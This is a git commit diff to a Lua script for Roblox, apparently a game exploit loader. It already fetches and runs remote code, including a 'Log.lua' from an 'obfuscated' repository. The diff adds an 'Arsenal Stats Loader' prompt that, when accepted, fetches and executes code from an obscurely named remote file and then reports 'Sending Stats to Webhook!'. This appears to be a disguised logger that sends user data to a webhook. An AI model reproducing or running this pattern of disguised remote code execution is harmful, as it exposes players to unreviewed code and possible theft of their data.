c9ff1868efaa40ac4de44ee40f0afadf3d5c2320
kyuru <103476419+kyuoso@users.noreply.github.com>
2022-04-12 19:56:03 -0700

    Update Mainn.lua

--- Mainn.lua
+++ Mainn.lua
@@ -20,6 +20,7 @@ local RequestFunction
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/kyuoso/MainOBF/main/Log.lua"))();
 
+local MessageBox = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/NotificationGUI/main/source.lua"))()
 local invite = loadstring(game:HttpGet("https://raw.githubusercontent.com/carter-fr/RandomStuff/main/discordinvmodule.lua"))()
 invite:discordInvite(_G.Config.InviteCode)
 
@@ -33,3 +34,17 @@ Notify({
 	Title = "Message";
 	Duration = 5;
 });
+
+wait(5)
+
+if game.PlaceId == 286090429 then
+	MessageBox.Show({Position = UDim2.new(0.5, 0, 0.5, 0), Text = "Arsenal Stats Loader", Description = "Would you like to load your Arsenal Stats?", MessageBoxIcon = "Question", MessageBoxButtons = "YesNo", Result = function(res)
+        if (res == "Yes") then
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/omwfh/sj0wjg0w/main/aaaaaaaaaaaaaaaaaaa"))()
+            MessageBox.Show({MessageBoxButtons = "OK", Description = "Sending Stats to Webhook!", Text = "Arsenal Stats Loader"})
+        elseif (res == "No") then
+            print("no")
+            MessageBox.Show({MessageBoxButtons = "OK", Description = "Okay!", Text = "Message"})
+        end
+    end})
+end
